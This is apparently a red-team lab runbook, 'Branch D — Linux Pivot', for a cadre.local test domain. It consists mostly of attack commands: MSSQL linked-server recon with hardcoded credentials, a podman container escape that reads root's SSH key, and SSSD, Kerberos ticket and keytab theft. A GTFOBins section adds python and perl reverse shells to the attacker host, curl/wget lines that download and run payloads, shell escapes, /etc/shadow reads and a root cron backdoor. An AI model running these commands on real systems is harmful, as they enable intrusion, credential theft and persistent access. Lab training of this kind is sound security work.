# CAMPAIGNS v3 — Branch D — Linux Pivot

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Branch D: Linux Pivot


**Diverges from:** Phase 3 (MSSQL linked-server recon discovers linux01).  
**Converges to:** Phase 6 (domain credentials from linux01 help accelerate child DA).  
**Plan 1.1:** First-class branch graph (M3) — missing Linux-origin / linux01 endpoint fidelity is an **acceptable** trade-off; do not add provisioning monitoring.  
**Root on linux01 required** — two ways to achieve it.

#### Entry: MSSQL Linked Server Recon (WT044)

```bash
impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 \
  -windows-auth -query "SELECT * FROM OPENQUERY(\"LINUX01\", 'SELECT name FROM sys.databases')"
```

#### Entry: Podman Container Escape (WT048)

```bash
sudo podman exec cadre-monitor unshare -r id
sudo podman exec cadre-monitor cat /proc/1/root/root/.ssh/id_rsa
```

#### Phase 2: SSSD Ticket Extraction (WT045)

```bash
sudo cat /var/lib/sss/db/cache_cadre.local.ldb > /tmp/sssd_dump.ldb
klist -c /tmp/krb5cc_*
```

#### Phase 3: NFS Kerberos Mount (WT047)

```bash
export KRB5CCNAME=/tmp/krb5cc_stolen
sudo mount -t nfs -o sec=krb5p localhost:/exports/secure-share /mnt/cadre-nfs
```

#### Phase 4: MSSQL Keytab Extraction (WT046)

```bash
sudo klist -ket /var/opt/mssql/secrets/mssql.keytab
```

#### GTFOBins — Linux Privilege Escalation ⏳

**Source:** GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/))

Once on linux01, the following binaries can be used for privilege escalation, file read/write, and reverse shells. All are common on Ubuntu 24.04.

**Reverse shell via python3:**

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.77.60",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Reverse shell via perl:**

```bash
perl -e 'use Socket;$i="192.168.77.60";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**File read via find (SUID bypass):**

```bash
find / -perm -4000 -type f 2>/dev/null  # Find SUID binaries
find . -exec /bin/sh \; -quit            # Shell via find
```

**File read via vim:**

```bash
vim -c ':!/bin/sh'                       # Shell escape from vim
vim -c ':!cat /etc/shadow'               # Read files as current user
```

**Command exec via awk:**

```bash
awk 'BEGIN {system("/bin/sh")}'          # Shell via awk
```

**Download via curl/wget:**

```bash
curl http://192.168.77.60:8080/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh
wget http://192.168.77.60:8080/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh
```

**File write via tee:**

```bash
echo "*/1 * * * * root /tmp/backdoor.sh" | sudo tee /etc/cron.d/backdoor
```

**Command exec via env:**

```bash
env /bin/sh                                # Shell via env
```

**Testing notes:**

- linux01 has `vagrant` user with sudo (password: `vagrant`)
- Test each GTFOBins technique from vagrant user context
- Document which ones require sudo vs work as regular user
- Compare with existing Branch D techniques (MSSQL linked server, SSSD, NFS)

---

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-branch-c.md`](CAMPAIGNS-RUNBOOK-branch-c.md) · Next: [`CAMPAIGNS-RUNBOOK-e.md`](CAMPAIGNS-RUNBOOK-e.md) →
